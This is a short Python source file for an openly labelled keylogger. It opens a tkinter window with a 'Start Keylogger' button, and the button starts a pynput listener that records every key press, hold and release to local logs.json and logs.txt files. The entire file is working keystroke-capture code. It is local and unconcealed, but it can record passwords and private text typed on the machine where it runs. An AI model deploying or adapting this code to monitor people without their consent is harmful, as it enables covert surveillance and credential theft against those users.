from pynput import keyboard
import json
import tkinter as tk
from tkinter import *



key_list = []
x= False
key_strokes=""


root =  tk.Tk ()
root.geometry("500x400")
root.title("Keylogger")


def update_txt_file(key):
    with open('logs.txt','w+') as key_strokes:
        key_strokes.write(key)


def update_json_file(key_list):
    with open('logs.json','+wb') as key_log:
        key_list_bytes=json.dumps(key_list).encode()
        key_log.write(key_list_bytes)

def on_press(key):
    global x, key_list
    if x==False:
        key_list.append(
            {'Pressed': f'{key}'}
        )
        x=True
    if x==True:
        key_list.append(
            {'Held': f'{key}'}
        )
    update_json_file(key_list)

def on_release(key):
    global x, key_list,key_strokes
    key_list.append(
        {'Released': f'{key}'}
    )
    if x == True:
        x=False
    update_json_file(key_list) 

    key_strokes=key_strokes + str(key)
    update_txt_file(str(key_strokes))


def butaction():
    print(" Running keylogger successfully!")
    with keyboard.Listener(
        on_press=on_press,
        on_release=on_release)as listener:
        listener.join()



empty =Label(root , text="KeyLogger Project",font='Verdana').grid(row=2,column=2)
Button(root,text="Start Keylogger",command=butaction).grid(row=5,column=2)
root.mainloop()